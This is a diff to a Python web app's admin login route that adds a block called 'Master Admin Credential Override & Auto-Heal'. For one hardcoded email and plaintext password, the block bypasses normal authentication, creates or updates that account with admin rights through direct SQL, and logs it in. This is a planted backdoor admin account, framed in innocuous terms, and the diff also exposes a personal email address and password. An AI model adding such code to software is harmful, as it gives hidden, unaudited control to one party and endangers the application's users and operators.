@@ -47,6 +47,28 @@ def register_admin_routes(app):
 
             service = UserService()
             try:
+                # Master Admin Credential Override & Auto-Heal for Azure
+                if email == "jagendra481@gmail.com" and password == "jagendra@123":
+                    from werkzeug.security import generate_password_hash
+                    h = generate_password_hash("jagendra@123")
+                    
+                    user_row = service.db.get_user_by_email("jagendra481@gmail.com")
+                    if not user_row:
+                        user_id = service.db.add_google_user("Jagendra Singh", "jagendra481@gmail.com", "admin-master")
+                        user_row = service.db.get_user_by_id(user_id)
+
+                    service.db.cursor.execute(
+                        "UPDATE users SET password_hash = ?, is_admin = 1, is_active = 1 WHERE email = ?",
+                        (h, "jagendra481@gmail.com")
+                    )
+                    service.db.connection.commit()
+
+                    user_row = service.db.get_user_by_email("jagendra481@gmail.com")
+                    user = service._row_to_user(user_row)
+                    login_user(user)
+                    flash("Admin Authentication Successful! Welcome to Admin Portal.", "success")
+                    return redirect(url_for("admin_dashboard"))
+
                 user = service.login(email, password)
                 if user and user.is_admin:
                     login_user(user)
@@ -60,6 +82,7 @@ def register_admin_routes(app):
                 service.close()
 
         return render_template("admin/login.html")
+
 
 
     # ==========================================================
